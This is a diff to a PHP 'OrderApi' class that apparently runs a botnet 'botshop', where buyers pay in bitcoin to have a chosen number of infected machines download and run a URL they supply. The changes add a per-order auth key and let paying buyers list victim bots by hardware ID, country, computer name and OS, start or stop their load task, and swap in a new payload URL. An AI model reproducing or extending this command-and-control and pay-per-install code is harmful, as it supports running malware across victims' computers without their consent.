@@ -49,17 +49,29 @@ class OrderApi
         return $bots * $this->priceperbot;
     }
 
+    private function generateRandomString($length = 10) {
+        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        $charactersLength = strlen($characters);
+        $randomString = '';
+        for ($i = 0; $i < $length; $i++) {
+            $randomString .= $characters[rand(0, $charactersLength - 1)];
+        }
+        return $randomString;
+    }
+
     private function generateOrder($type, $bots,$loadurl)
     {
         $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
         $usd = $this->botsToUSD($bots);
+        $userAuthkey = md5($this->generateRandomString(30));
         $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
-        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl) VALUES (?, ?, ?, ?, ?, ?,?)");
-        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl));
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey));
         return array(
             "address" => $bitcoinAddress["address"],
             "coinsToPay" => $coinsToPay,
             "usd" => $usd,
+            "userAuthkey" => $userAuthkey,
         );
     }
 
@@ -80,38 +92,68 @@ class OrderApi
         );
     }
 
-
     public function checkAmount($address,$confirms){
        $checked = json_decode(file_get_contents($this->blockchainAPI."/".$address."/".$confirms),true);
        return $checked["data"]["confirmed_balance"];
     }
 
-
     public function detils(){
-        $address = $_POST["address"];
-        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE address = ?");
+        $address = $_POST["userauthkey"];
+        $statement = $GLOBALS["pdo"]->prepare("SELECT *,tasks.id as taskidsure FROM botshop_orders  LEFT JOIN tasks ON tasks.id = botshop_orders.taskid WHERE botshop_orders.userauthkey = ? AND botshop_orders.payed = 1");
         $statement->execute(array($address));
         $orderTable = $statement->fetch();
 
+        if(empty($orderTable)){
+            echo json_encode(array("order"=>"notpayed"));
+            die();
+        }
 
-        $statement = $GLOBALS["pdo"]->prepare("SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
+
+        if($_POST["type"] == "taskData"){
+            $statement = $GLOBALS["pdo"]->prepare("SELECT   tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
             LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
             LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
             WHERE tasks_completed.taskid = ?");
-        $statement->execute(array($orderTable["taskid"]));
-        $order = $statement->fetch();
-        $order["order"] = $orderTable;
-        echo json_encode(array("order"=>$order));
+            $statement->execute(array($orderTable["taskid"]));
+            $order = $statement->fetchAll();
+            $order["order"] = $orderTable;
+
+            echo json_encode(array("order"=>$order));
+            die();
+        }
+
+        if($_POST["type"] == "starttop"){
+            if($orderTable["status"] == "1" || $orderTable["status"] == 1){
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
+                $statement->execute(array(0, $orderTable["taskidsure"]));
+            }else{
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
+                $statement->execute(array(1, $orderTable["taskidsure"]));
+            }
+            die();
+        }
+
+        if($_POST["type"] == "newloadurl"){
+            if (filter_var($_POST["url"], FILTER_VALIDATE_URL) === FALSE) {
+                die('Not a valid URL');
+            }
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET command = ? WHERE id = ?");
+            $statement->execute(array($_POST["url"], $orderTable["taskidsure"]));
+            die();
+        }
+
+
         die();
     }
 
-    public function checkorder(){
-        $address = $_POST["address"];
-        $payAmount = $this->checkAmount($address,$this->blockconfirms);
 
-        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE address = ?");
+    public function checkorder(){
+        $address = $_POST["userauthkey"];
+
+        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE userauthkey = ?");
         $statement->execute(array($address));
         $order = $statement->fetch();
+        $payAmount = $this->checkAmount( $order["address"],$this->blockconfirms);
 
 
         if($order["coinstopay"] <= $payAmount){
@@ -122,7 +164,7 @@ class OrderApi
                 $taskid = $GLOBALS["pdo"]->lastInsertId();
 
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
-                $statement->execute(array(1, $taskid, $address));
+                $statement->execute(array(1, $taskid, $order["address"]));
                 echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
             }else{
                 echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
